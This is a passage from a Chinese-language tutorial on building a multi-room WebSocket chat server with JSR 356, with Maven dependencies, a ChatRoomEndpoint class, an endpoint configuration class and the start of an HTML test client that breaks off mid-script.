关联起来</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>通过这种方式，<code>AuthConfigurator</code> 扮演了一个“门卫”的角色，在连接真正建立之前就完成了安全检查，将业务逻辑与认证逻辑清晰地分离开来。</p>
<hr>
<h2 id="4-示例代码"><a href="#4-示例代码" class="headerlink" title="4. 示例代码"></a>4. 示例代码</h2><h3 id="4-1-项目结构和依赖"><a href="#4-1-项目结构和依赖" class="headerlink" title="4.1 项目结构和依赖"></a>4.1 项目结构和依赖</h3><p>首先，确保你的项目是一个标准的 Web 应用（例如 Maven 的 <code>war</code> packaging），并已添加 <code>jakarta.websocket-api</code> 或 <code>javax.websocket-api</code> 依赖，且 <code>scope</code> 为 <code>provided</code>。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- pom.xml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.websocket<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.websocket-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 你还需要一个 Servlet API 依赖，通常也是 provided --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-2-服务端点-ChatRoomEndpoint-java"><a href="#4-2-服务端点-ChatRoomEndpoint-java" class="headerlink" title="4.2 服务端点 ChatRoomEndpoint.java"></a>4.2 服务端点 <code>ChatRoomEndpoint.java</code></h3><p>这是我们的核心逻辑所在。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 一个简单的多房间聊天室 WebSocket 端点。</span></span><br><span class="line"><span class="comment"> * 用户通过 ws://&lt;host&gt;:&lt;port&gt;/&lt;context&gt;/chat/&#123;username&#125;/&#123;room&#125; 连接。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ServerEndpoint(&quot;/chat/&#123;username&#125;/&#123;room&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChatRoomEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态集合，用于存储所有聊天室的会话。</span></span><br><span class="line">    <span class="comment">// Key: 房间名, Value: 该房间内所有会话的 Set。</span></span><br><span class="line">    <span class="comment">// 使用 ConcurrentHashMap 和 CopyOnWriteArraySet 来保证线程安全。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, CopyOnWriteArraySet&lt;Session&gt;&gt; rooms = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当一个新的 WebSocket 连接建立时调用。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> session  代表当前连接的会话对象。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username 从 URL 路径中提取的用户名。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> room     从 URL 路径中提取的房间名。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@OnOpen</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, <span class="meta">@PathParam(&quot;username&quot;)</span> String username, <span class="meta">@PathParam(&quot;room&quot;)</span> String room)</span> &#123;</span><br><span class="line">        <span class="comment">// 将用户信息存储在 session 的 userProperties 中，方便后续使用。</span></span><br><span class="line">        session.getUserProperties().put(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">        session.getUserProperties().put(<span class="string">&quot;room&quot;</span>, room);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将会话加入对应房间的集合中。</span></span><br><span class="line">        <span class="comment">// computeIfAbsent 是一个原子操作，如果 room 不存在，则创建一个新的 Set。</span></span><br><span class="line">        rooms.computeIfAbsent(room, k -&gt; <span class="keyword">new</span> <span class="title class_">CopyOnWriteArraySet</span>&lt;&gt;()).add(session);</span><br><span class="line"></span><br><span class="line">        System.out.printf(<span class="string">&quot;User &#x27;%s&#x27; joined room &#x27;%s&#x27;. Session ID: %s%n&quot;</span>, username, room, session.getId());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 准备一条加入通知消息。</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">joinMessage</span> <span class="operator">=</span> String.format(<span class="string">&quot;System: User &#x27;%s&#x27; has joined the room.&quot;</span>, username);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向房间内的所有用户广播这条加入消息。</span></span><br><span class="line">        broadcast(room, joinMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当服务器从客户端收到消息时调用。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> message 客户端发送的文本消息。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> session 发送消息的会话。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@OnMessage</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message, Session session)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) session.getUserProperties().get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">room</span> <span class="operator">=</span> (String) session.getUserProperties().get(<span class="string">&quot;room&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.printf(<span class="string">&quot;Received message from &#x27;%s&#x27; in room &#x27;%s&#x27;: %s%n&quot;</span>, username, room, message);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 格式化消息，附带发送者信息。</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">formattedMessage</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s&quot;</span>, username, message);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将消息广播给同一房间内的所有用户（包括发送者自己）。</span></span><br><span class="line">        broadcast(room, formattedMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当一个 WebSocket 连接关闭时调用。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> session     被关闭的会话。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> closeReason 关闭的原因。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@OnClose</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(Session session, CloseReason closeReason)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) session.getUserProperties().get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">room</span> <span class="operator">=</span> (String) session.getUserProperties().get(<span class="string">&quot;room&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从房间的会话集合中移除当前会话。</span></span><br><span class="line">        CopyOnWriteArraySet&lt;Session&gt; roomSessions = rooms.get(room);</span><br><span class="line">        <span class="keyword">if</span> (roomSessions != <span class="literal">null</span>) &#123;</span><br><span class="line">            roomSessions.remove(session);</span><br><span class="line">            <span class="comment">// 如果房间变空，可以考虑从 rooms Map 中移除。</span></span><br><span class="line">            <span class="keyword">if</span> (roomSessions.isEmpty()) &#123;</span><br><span class="line">                rooms.remove(room);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.printf(<span class="string">&quot;User &#x27;%s&#x27; left room &#x27;%s&#x27;. Reason: %s%n&quot;</span>, username, room, closeReason.getReasonPhrase());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 准备一条离开通知消息。</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">leaveMessage</span> <span class="operator">=</span> String.format(<span class="string">&quot;System: User &#x27;%s&#x27; has left the room.&quot;</span>, username);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向房间内剩余的用户广播这条离开消息。</span></span><br><span class="line">        broadcast(room, leaveMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当通信过程中发生错误时调用。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> session   发生错误的会话。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> throwable 抛出的异常。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@OnError</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable throwable)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) session.getUserProperties().get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        System.err.printf(<span class="string">&quot;Error for user &#x27;%s&#x27; in session %s: %s%n&quot;</span>, username, session.getId(), throwable.getMessage());</span><br><span class="line">        throwable.printStackTrace();</span><br><span class="line">        <span class="comment">// 发生错误后，通常连接会随之关闭，onClose 方法会被调用。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 辅助方法：向指定房间的所有会话广播消息。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> room    房间名。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> message 要广播的消息。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">broadcast</span><span class="params">(String room, String message)</span> &#123;</span><br><span class="line">        CopyOnWriteArraySet&lt;Session&gt; sessionsInRoom = rooms.get(room);</span><br><span class="line">        <span class="keyword">if</span> (sessionsInRoom != <span class="literal">null</span>) &#123;</span><br><span class="line">            sessionsInRoom.forEach(session -&gt; &#123;</span><br><span class="line">                <span class="comment">// 使用异步方式发送消息，避免阻塞。</span></span><br><span class="line">                <span class="keyword">synchronized</span> (session) &#123; <span class="comment">// 简单同步，防止多线程同时操作一个 session</span></span><br><span class="line">                    <span class="keyword">if</span> (session.isOpen()) &#123;</span><br><span class="line">                        session.getAsyncRemote().sendText(message, result -&gt; &#123;</span><br><span class="line">                            <span class="keyword">if</span> (result.isOK()) &#123;</span><br><span class="line">                                <span class="comment">// System.out.println(&quot;Async message sent to &quot; + session.getId());</span></span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                System.err.printf(<span class="string">&quot;Failed to send message to session %s: %s%n&quot;</span>,</span><br><span class="line">                                        session.getId(), result.getException().getMessage());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-启用-WebSocket-支持-ApplicationConfig-java"><a href="#4-3-启用-WebSocket-支持-ApplicationConfig-java" class="headerlink" title="4.3 启用 WebSocket 支持 (ApplicationConfig.java)"></a>4.3 启用 WebSocket 支持 (<code>ApplicationConfig.java</code>)</h3><p>为了让 Servlet 容器（如 Tomcat）能够扫描到我们的 <code>@ServerEndpoint</code>，我们需要一个配置类来初始化 WebSocket 环境。最简单的方法是创建一个实现了 <code>ServerApplicationConfig</code> 接口的类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这个类用于告诉容器哪些类是 WebSocket 端点。</span></span><br><span class="line"><span class="comment"> * 容器启动时会自动扫描并加载这个配置。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketAppConfig</span> <span class="keyword">implements</span> <span class="title class_">ServerApplicationConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ServerEndpointConfig&gt; <span class="title function_">getEndpointConfigs</span><span class="params">(Set&lt;Class&lt;? extends Endpoint&gt;&gt; endpointClasses)</span> &#123;</span><br><span class="line">        <span class="comment">// 这个方法可以用于动态创建和配置端点，我们这里用不到，返回空集合即可。</span></span><br><span class="line">        <span class="keyword">return</span> Set.of();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Class&lt;?&gt;&gt; getAnnotatedEndpointClasses(Set&lt;Class&lt;?&gt;&gt; scanned) &#123;</span><br><span class="line">        <span class="comment">// 这个方法是关键。容器会传入所有扫描到的类，我们在这里筛选出带有 @ServerEndpoint 注解的类。</span></span><br><span class="line">        <span class="comment">// 如果你的端点类在扫描路径下，直接返回 scanned 也可以。</span></span><br><span class="line">        <span class="comment">// 为了清晰，我们这里显式地返回我们的端点类。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Scanning for WebSocket endpoints... Found: &quot;</span> + scanned.size());</span><br><span class="line">        </span><br><span class="line">        Set&lt;Class&lt;?&gt;&gt; endpoints = Stream.of(</span><br><span class="line">            com.example.websocket.chat.ChatRoomEndpoint.class</span><br><span class="line">        ).collect(Collectors.toSet());</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;Registering WebSocket endpoints: &quot;</span> + endpoints);</span><br><span class="line">        <span class="keyword">return</span> endpoints;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在实际项目中，更通用的做法是不过滤，让容器自己处理：</span></span><br><span class="line">        <span class="comment">// return scanned;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-4-客户端测试-index-html"><a href="#4-4-客户端测试-index-html" class="headerlink" title="4.4 客户端测试 (index.html)"></a>4.4 客户端测试 (<code>index.html</code>)</h3><p>创建一个简单的 HTML 页面来测试我们的聊天室。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSR 356 WebSocket Chat<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123; <span class="attribute">font-family</span>: sans-serif; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#chat-window</span> &#123; <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>; <span class="attribute">height</span>: <span class="number">300px</span>; <span class="attribute">overflow-y</span>: scroll; <span class="attribute">padding</span>: <span class="number">10px</span>; <span class="attribute">margin-bottom</span>: <span class="number">10px</span>; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#chat-window</span> <span class="selector-tag">p</span> &#123; <span class="attribute">margin</span>: <span class="number">0</span>; <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">0</span>; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#controls</span> <span class="selector-tag">input</span> &#123; <span class="attribute">width</span>: <span class="number">200px</span>; <span class="attribute">margin-right</span>: <span class="number">10px</span>; &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Simple WebSocket Chat<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;connect-controls&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Your Username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;User_&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;room&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Room Name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;general&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;connectBtn&quot;</span>&gt;</span>Connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;disconnectBtn&quot;</span> <span class="attr">disabled</span>&gt;</span>Disconnect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chat-window&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;message-controls&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;message&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Type a message...&quot;</span> <span class="attr">disabled</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;sendBtn&quot;</span> <span class="attr">disabled</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> usernameInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> roomInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;room&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> connectBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;connectBtn&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> disconnectBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;disconnectBtn&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> chatWindow = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;chat-window&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> messageInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;message&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> sendBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;sendBtn&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> websocket;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 动态生成一个唯一用户名</span></span></span><br><span class="line"><span class="language-javascript">        usernameInput.<span class="property">value</span> += <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">logMessage</span>(<span class="params">message</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            p.<span class="property">textContent</span> = message;</span></span><br><span class="line"><span class="language-javascript">            chatWindow.<span class="title function_">appendChild</span>(p);</span></span><br><span class="line"><span class="language-javascript">            chatWindow.<span class="property">scrollTop</span> = chatWindow.<span class="property">scrollHeight</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        connectBtn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span 